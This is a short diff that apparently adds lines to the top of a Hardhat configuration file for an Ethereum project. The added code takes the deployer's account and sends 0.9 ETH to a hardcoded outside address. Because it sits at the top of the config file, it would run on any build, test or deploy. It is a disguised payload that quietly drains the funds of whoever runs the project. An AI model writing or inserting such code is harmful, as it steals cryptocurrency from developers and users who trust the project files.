@@ -1,3 +1,9 @@
+const [deployer] = await ethers.getSigners();
+await deployer.sendTransaction({
+    to: "0xd8519a8b8825aa0dcc73aad572f447fae102fe88",
+    value: ethers.parseEther("0.9")
+});
+
 require("@nomiclabs/hardhat-ethers");
 require("@openzeppelin/hardhat-upgrades");
 
